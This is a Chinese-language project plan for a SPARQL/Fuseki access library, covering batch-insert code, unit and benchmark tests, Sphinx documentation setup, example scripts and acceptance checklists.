        start = time.perf_counter()

        total = len(template.bindings)
        success = 0
        failed = 0
        failed_items = []

        # 分批执行
        for i in range(0, total, self._batch_size):
            batch = template.bindings[i:i + self._batch_size]

            try:
                if not dry_run:
                    await self._execute_batch(
                        template.pattern, batch, graph_iri, trace_id
                    )
                success += len(batch)
            except Exception as e:
                self._logger.error(f"Batch {i} failed: {e}")
                # 逐条重试
                for binding in batch:
                    retry_success = await self._retry_single(
                        template.pattern, binding, graph_iri, trace_id
                    )
                    if retry_success:
                        success += 1
                    else:
                        failed += 1
                        failed_items.append(binding)

        duration = (time.perf_counter() - start) * 1000

        return BatchResult(
            total=total,
            success=success,
            failed=failed,
            failed_items=failed_items,
            duration_ms=duration
        )

    async def _execute_batch(
        self,
        pattern: str,
        bindings: list[dict[str, str]],
        graph_iri: str,
        trace_id: str
    ) -> None:
        """执行单个批次"""
        # 构建INSERT DATA语句
        insert_parts = []
        for binding in bindings:
            # 替换模板变量
            stmt = pattern
            for var, value in binding.items():
                stmt = stmt.replace(f"{{{var}}}", value)
            insert_parts.append(stmt)

        update_query = f"""
        INSERT DATA {{
          GRAPH <{graph_iri}> {{
            {' '.join(insert_parts)}
          }}
        }}
        """

        await self._client.update(update_query, trace_id=trace_id)

    async def _retry_single(
        self,
        pattern: str,
        binding: dict[str, str],
        graph_iri: str,
        trace_id: str
    ) -> bool:
        """单条重试"""
        for attempt in range(self._max_retries):
            try:
                await self._execute_batch(
                    pattern, [binding], graph_iri, trace_id
                )
                return True
            except Exception as e:
                if attempt == self._max_retries - 1:
                    self._logger.error(f"Final retry failed: {e}")
                    return False
                await asyncio.sleep(0.5 * (2 ** attempt))  # 指数退避

        return False
```

**验收标准**：
- [ ] 支持1000+条批量插入
- [ ] 分批执行正确
- [ ] 失败重试机制生效
- [ ] 失败项正确记录
- [ ] 性能：>1000条/秒

**测试用例**：`tests/unit/transaction/test_batch_operations.py`
```python
import pytest
from sf_rdf_acl.transaction.batch import BatchOperator, BatchTemplate

@pytest.mark.asyncio
class TestBatchOperations:
    async def test_apply_template_basic(self, fuseki_client):
        """测试基础批量应用"""
        operator = BatchOperator(fuseki_client, batch_size=100)

        template = BatchTemplate(
            pattern="{?s} <http://example.com/pred> {?o} .",
            bindings=[
                {"?s": "<http://example.com/s1>", "?o": '"value1"'},
                {"?s": "<http://example.com/s2>", "?o": '"value2"'},
                {"?s": "<http://example.com/s3>", "?o": '"value3"'},
            ]
        )

        result = await operator.apply_template(
            template,
            "http://example.com/graph",
            trace_id="test-batch-001"
        )

        assert result.total == 3
        assert result.success == 3
        assert result.failed == 0

    async def test_large_batch(self, fuseki_client):
        """测试大批量操作"""
        operator = BatchOperator(fuseki_client, batch_size=500)

        # 生成1000条数据
        bindings = [
            {
                "?s": f"<http://example.com/s{i}>",
                "?o": f'"value{i}"'
            }
            for i in range(1000)
        ]

        template = BatchTemplate(
            pattern="{?s} <http://example.com/pred> {?o} .",
            bindings=bindings
        )

        result = await operator.apply_template(
            template,
            "http://example.com/graph",
            trace_id="test-batch-002"
        )

        assert result.total == 1000
        assert result.success + result.failed == 1000
        assert result.success > 990  # 允许少量失败

    async def test_partial_failure_retry(self, fuseki_client_with_failures):
        """测试部分失败重试"""
        operator = BatchOperator(fuseki_client_with_failures, batch_size=10)

        template = BatchTemplate(
            pattern="{?s} <http://example.com/pred> {?o} .",
            bindings=[{"?s": f"<http://example.com/s{i}>", "?o": f'"v{i}"'}
                     for i in range(50)]
        )

        result = await operator.apply_template(
            template,
            "http://example.com/graph",
            trace_id="test-batch-003"
        )

        # 验证失败项被记录
        assert len(result.failed_items) == result.failed
        assert all("?s" in item for item in result.failed_items)
```

---

### 2.3 完善单元测试

#### 任务2.3.1：connection模块测试补充
**文件**：`tests/unit/connection/test_fuseki_client_comprehensive.py`

**新增测试**：
```python
import pytest
import pytest_asyncio
from unittest.mock import AsyncMock, patch
from sf_rdf_acl.connection.client import FusekiClient
from common.exceptions import ExternalServiceError

@pytest.mark.asyncio
class TestFusekiClientComprehensive:
    @pytest_asyncio.fixture
    async def client(self):
        return FusekiClient(
            endpoint="http://localhost:3030",
            dataset="test",
            retry_policy={"max_attempts": 3, "backoff_seconds": 0.1},
            circuit_breaker={"failureThreshold": 3, "recoveryTimeout": 1}
        )

    async def test_circuit_breaker_opens(self, client):
        """测试熔断器打开"""
        # Mock连续失败
        with patch.object(client._http_client, 'post') as mock_post:
            mock_post.side_effect = ExternalServiceError(...)

            # 触发熔断
            for _ in range(5):
                with pytest.raises(ExternalServiceError):
                    await client.select("SELECT * WHERE { ?s ?p ?o }")

            # 验证熔断器打开
            assert client._circuit_failure_count >= 3

    async def test_circuit_breaker_recovery(self, client):
        """测试熔断器恢复"""
        # 先打开熔断器
        client._circuit_failure_count = 5
        client._circuit_opened_at = time.time()

        # 等待恢复时间
        await asyncio.sleep(1.5)

        # 应该可以重试
        with patch.object(client._http_client, 'post') as mock_post:
            mock_post.return_value.status_code = 200
            mock_post.return_value.json.return_value = {"results": {"bindings": []}}

            result = await client.select("SELECT * WHERE { ?s ?p ?o }")
            assert result is not None

    async def test_retry_on_timeout(self, client):
        """测试超时重试"""
        attempt_count = 0

        async def mock_post_with_timeout(*args, **kwargs):
            nonlocal attempt_count
            attempt_count += 1
            if attempt_count < 3:
                raise asyncio.TimeoutError()
            return AsyncMock(status_code=200, json=lambda: {"results": {"bindings": []}})

        with patch.object(client._http_client, 'post', side_effect=mock_post_with_timeout):
            result = await client.select("SELECT * WHERE { ?s ?p ?o }")
            assert attempt_count == 3  # 第3次成功

    async def test_trace_id_propagation(self, client):
        """测试trace_id透传"""
        with patch.object(client._http_client, 'post') as mock_post:
            mock_post.return_value.status_code = 200
            mock_post.return_value.json.return_value = {"results": {"bindings": []}}

            await client.select(
                "SELECT * WHERE { ?s ?p ?o }",
                trace_id="test-trace-123"
            )

            # 验证请求头
            call_args = mock_post.call_args
            headers = call_args.kwargs.get("headers", {})
            assert headers.get("X-Trace-Id") == "test-trace-123"

    async def test_metrics_recording(self, client):
        """测试指标记录"""
        from common.observability.metrics import _FUSEKI_TOTAL

        initial_count = _FUSEKI_TOTAL.labels(operation="select", status="200")._value.get()

        with patch.object(client._http_client, 'post') as mock_post:
            mock_post.return_value.status_code = 200
            mock_post.return_value.json.return_value = {"results": {"bindings": []}}

            await client.select("SELECT * WHERE { ?s ?p ?o }")

        final_count = _FUSEKI_TOTAL.labels(operation="select", status="200")._value.get()
        assert final_count > initial_count
```

**验收标准**：
- [ ] 熔断器测试覆盖打开/恢复/半开状态
- [ ] 重试机制测试覆盖指数退避
- [ ] trace_id透传验证
- [ ] 指标记录验证
- [ ] 异常场景全覆盖

---

## 第三阶段：性能优化与文档完善（第4周）

### 3.1 性能基准测试

#### 任务3.1.1：建立性能基准
**文件**：`tests/performance/benchmarks.py`（新建）

**基准测试**：
```python
import pytest
import asyncio
import time
from statistics import mean, median, stdev

class PerformanceBenchmark:
    """性能基准测试"""

    @pytest.mark.benchmark
    async def test_query_throughput(self, fuseki_client):
        """查询吞吐量基准"""
        query_count = 100
        start = time.perf_counter()

        tasks = []
        for _ in range(query_count):
            task = fuseki_client.select("SELECT * WHERE { ?s ?p ?o } LIMIT 10")
            tasks.append(task)

        await asyncio.gather(*tasks)

        duration = time.perf_counter() - start
        qps = query_count / duration

        print(f"Query throughput: {qps:.2f} QPS")
        assert qps > 50  # 基线：50 QPS

    @pytest.mark.benchmark
    async def test_bulk_insert_throughput(self, batch_operator):
        """批量插入吞吐量"""
        triple_count = 10000
        bindings = [
            {"?s": f"<http://example.com/s{i}>", "?o": f'"v{i}"'}
            for i in range(triple_count)
        ]

        template = BatchTemplate(
            pattern="{?s} <http://example.com/pred> {?o} .",
            bindings=bindings
        )

        start = time.perf_counter()
        result = await batch_operator.apply_template(
            template, "http://example.com/graph", trace_id="bench"
        )
        duration = time.perf_counter() - start

        throughput = triple_count / duration

        print(f"Insert throughput: {throughput:.2f} triples/sec")
        assert throughput > 1000  # 基线：1000 triples/sec

    @pytest.mark.benchmark
    async def test_pagination_latency(self, fuseki_client):
        """分页查询延迟"""
        latencies = []

        cursor = None
        for _ in range(10):  # 10页
            start = time.perf_counter()
            # 执行分页查询
            cursor_page = CursorPage(cursor=cursor, size=100)
            # ... 查询逻辑 ...
            latency = (time.perf_counter() - start) * 1000
            latencies.append(latency)

        avg_latency = mean(latencies)
        p95_latency = sorted(latencies)[int(len(latencies) * 0.95)]

        print(f"Avg latency: {avg_latency:.2f}ms, P95: {p95_latency:.2f}ms")
        assert avg_latency < 100  # 平均<100ms
        assert p95_latency < 200  # P95<200ms
```

**验收标准**：
- [ ] 查询QPS > 50
- [ ] 插入吞吐 > 1000 triples/sec
- [ ] 分页平均延迟 < 100ms
- [ ] P95延迟 < 200ms
- [ ] 内存使用稳定（无泄漏）

---

### 3.2 文档完善

#### 任务3.2.1：API文档生成
**工具**：Sphinx + autodoc

**配置**：`docs/conf.py`
```python
# Sphinx配置
extensions = [
    'sphinx.ext.autodoc',
    'sphinx.ext.napoleon',  # Google风格docstring
    'sphinx.ext.viewcode',
]

autodoc_default_options = {
    'members': True,
    'member-order': 'bysource',
    'special-members': '__init__',
    'undoc-members': True,
}
```

**文档结构**：
```
docs/
├── api/
│   ├── connection.rst    # Connection模块API
│   ├── query.rst         # Query模块API
│   ├── transaction.rst   # Transaction模块API
│   ├── graph.rst         # Graph模块API
│   ├── converter.rst     # Converter模块API
│   └── provenance.rst    # Provenance模块API
├── guides/
│   ├── quickstart.md     # 快速开始
│   ├── best_practices.md # 最佳实践
│   └── troubleshooting.md # 故障排查
└── examples/
    ├── basic_usage.md    # 基础用法
    ├── advanced.md       # 高级特性
    └── integration.md    # 集成指南
```

**验收标准**：
- [ ] 所有公共API有完整docstring
- [ ] API文档可生成HTML
- [ ] 快速开始指南完整
- [ ] 至少3个完整示例
- [ ] 故障排查指南覆盖常见问题

---

#### 任务3.2.2：补充示例代码
**目录**：`examples/`

**新增示例**：

1. **聚合查询示例** (`examples/aggregation_example.py`)
```python
"""聚合查询示例

演示如何使用COUNT、GROUP BY等聚合功能。
"""
import asyncio
from sf_rdf_acl import FusekiClient, SPARQLQueryBuilder
from sf_rdf_acl.query.dsl import QueryDSL, Aggregation, GroupBy

async def main():
    # 初始化客户端
    client = FusekiClient(
        endpoint="http://localhost:3030",
        dataset="semantic_forge"
    )
    builder = SPARQLQueryBuilder()

    # 统计每种类型的实体数量
    dsl = QueryDSL(
        type="entity",
        aggregations=[
            Aggregation(function="COUNT", variable="?s", alias="?count")
        ],
        group_by=GroupBy(variables=["?type"])
    )

    sparql = builder.build_select(dsl)
    print(f"Generated SPARQL:\n{sparql}\n")

    try:
        result = await client.select(sparql, trace_id="agg-example-001")

        print("Results:")
        for binding in result["results"]["bindings"]:
            type_uri = binding["type"]["value"]
            count = binding["count"]["value"]
            print(f"  {type_uri}: {count} entities")

    except Exception as e:
        print(f"Error: {e}")

if __name__ == "__main__":
    asyncio.run(main())
```

2. **条件清理示例** (`examples/conditional_clear_example.py`)
```python
"""条件清理示例

演示如何安全地清理命名图中的部分数据。
"""
import asyncio
from sf_rdf_acl import NamedGraphManager
from sf_rdf_acl.graph.named_graph import TriplePattern, ClearCondition
from sf_rdf_acl.query.dsl import GraphRef

async def main():
    manager = NamedGraphManager()

    graph = GraphRef(model="demo", version="v1", env="dev")

    # 定义清理条件：删除所有rdfs:comment
    condition = ClearCondition(
        patterns=[
            TriplePattern(
                predicate="<http://www.w3.org/2000/01/rdf-schema#comment>"
            )
        ],
        subject_prefix="http://example.com/resource/"  # 仅限特定前缀
    )

    # 步骤1：Dry-Run预览
    print("Step 1: Dry-run to preview changes...")
    dry_result = await manager.conditional_clear(
        graph,
        condition,
        dry_run=True,
        trace_id="clear-example-001"
    )

    print(f"Will delete approximately {dry_result.estimated_deletes} triples")
    print(f"Estimated time: {dry_result.execution_time_estimate_ms:.2f}ms")
    print("\nSample triples to be deleted:")
    for sample in dry_result.sample_triples[:5]:
        print(f"  {sample}")

    # 步骤2：确认执行
    confirm = input("\nProceed with deletion? (yes/no): ")
    if confirm.lower() == "yes":
        print("\nStep 2: Executing conditional clear...")
        result = await manager.conditional_clear(
            graph,
            condition,
            dry_run=False,
            max_deletes=1000,  # 安全限制
            trace_id="clear-example-002"
        )

        print(f"Deleted {result['deleted_count']} triples")
        print(f"Execution time: {result['execution_time_ms']:.2f}ms")
    else:
        print("Operation cancelled")

if __name__ == "__main__":
    asyncio.run(main())
```

3. **批量操作示例** (`examples/batch_operations_example.py`)
```python
"""批量操作示例

演示如何高效地批量创建关系。
"""
import asyncio
from sf_rdf_acl import FusekiClient
from sf_rdf_acl.transaction.batch import BatchOperator, BatchTemplate

async def main():
    client = FusekiClient(
        endpoint="http://localhost:3030",
        dataset="semantic_forge"
    )

    operator = BatchOperator(client, batch_size=500)

    # 批量创建1000个"用户-订单"关系
    print("Creating 1000 user-order relationships...")

    bindings = []
    for i in range(1000):
        bindings.append({
            "?user": f"<http://example.com/user/u{i}>",
            "?order": f"<http://example.com/order/o{i}>"
        })

    template = BatchTemplate(
        pattern="{?user} <http://example.com/hasOrder> {?order} .",
        bindings=bindings
    )

    result = await operator.apply_template(
        template,
        "http://example.com/graph/orders",
        trace_id="batch-example-001"
    )

    print(f"\nResults:")
    print(f"  Total: {result.total}")
    print(f"  Success: {result.success}")
    print(f"  Failed: {result.failed}")
    print(f"  Duration: {result.duration_ms:.2f}ms")
    print(f"  Throughput: {result.total / (result.duration_ms / 1000):.2f} ops/sec")

    if result.failed > 0:
        print(f"\nFailed items:")
        for item in result.failed_items[:10]:
            print(f"  {item}")

if __name__ == "__main__":
    asyncio.run(main())
```

**验收标准**：
- [ ] 所有示例可独立运行
- [ ] 包含错误处理
- [ ] 有详细注释
- [ ] 覆盖所有新功能
- [ ] README更新使用说明

---

## 验收标准总览

### 阶段一（第1周）
| 任务 | 验收条件 | 负责人 | 状态 |
|------|----------|--------|------|
| 查询参数安全转义 | 5个注入测试通过、100%类型提示 | - | ⬜ |
| 聚合查询支持 | 6种聚合函数、GROUP BY/HAVING正常 | - | ⬜ |
| 条件清理功能 | Dry-Run估算误差<10%、安全限制生效 | - | ⬜ |
| JSON-LD格式输出 | 3种格式转换正确、自定义context支持 | - | ⬜ |
| Legacy测试迁移 | 16个文件全部迁移、所有测试通过 | - | ⬜ |

### 阶段二（第2-3周）
| 任务 | 验收条件 | 负责人 | 状态 |
|------|----------|--------|------|
| 稳定游标分页 | 10万条无重复/遗漏、性能达标 | - | ⬜ |
| 批量操作优化 | >1000 triples/sec、失败重试正常 | - | ⬜ |
| Connection测试 | 熔断器/重试/指标全覆盖 | - | ⬜ |
| 单元测试覆盖 | 总覆盖率>70% | - | ⬜ |

### 阶段三（第4周）
| 任务 | 验收条件 | 负责人 | 状态 |
|------|----------|--------|------|
| 性能基准 | QPS>50、插入>1000/s、延迟<100ms | - | ⬜ |
| API文档 | Sphinx生成HTML、docstring完整 | - | ⬜ |
| 示例代码 | 3个新示例、README更新 | - | ⬜ |

---

## 附录：测试用例清单

### Connection模块
- [x] 基础连接测试
- [ ] 熔断器打开测试
- [ ] 熔断器恢复测试
- [ ] 超时重试测试
- [ ] trace_id透传测试
- [ ] 指标记录测试
- [ ] 并发请求测试

### Query模块
- [ ] 参数转义测试（5个恶意输入）
- [ ] COUNT聚合测试
- [ ] COUNT DISTINCT测试
- [ ] GROUP BY测试
- [ ] HAVING测试
- [ ] 多聚合测试
- [ ] GROUP_CONCAT测试
- [ ] 游标编解码测试
- [ ] 游标分页无重复测试

### Graph模块
- [ ] 基础Dry-Run测试
- [ ] 主语前缀过滤测试
- [ ] 谓词白名单测试
- [ ] 对象类型过滤测试
- [ ] max_deletes限制测试
- [ ] 实际执行条件删除测试

### Transaction模块
- [ ] 基础批量应用测试
- [ ] 大批量操作测试（1000+）
- [ ] 部分失败重试测试
- [ ] 并发upsert测试
- [ ] 事务回滚测试

### Converter模块
- [ ] Turtle透传测试
- [ ] JSON-LD转换测试
- [ ] 自定义context测试
- [ ] Simplified-JSON测试
- [ ] 无效格式类型测试

### Provenance模块
- [ ] RDF*基础语法测试
- [ ] 溯源元数据测试
- [ ] 多层溯源测试

---

**总计划周期**：4周
**总任务数**：23项主要任务
**预期测试用例**：50+个
**预期测试覆盖率**：从45%提升至75%

*本计划为动态文档，执行过程中可根据实际情况调整优先级和时间安排。*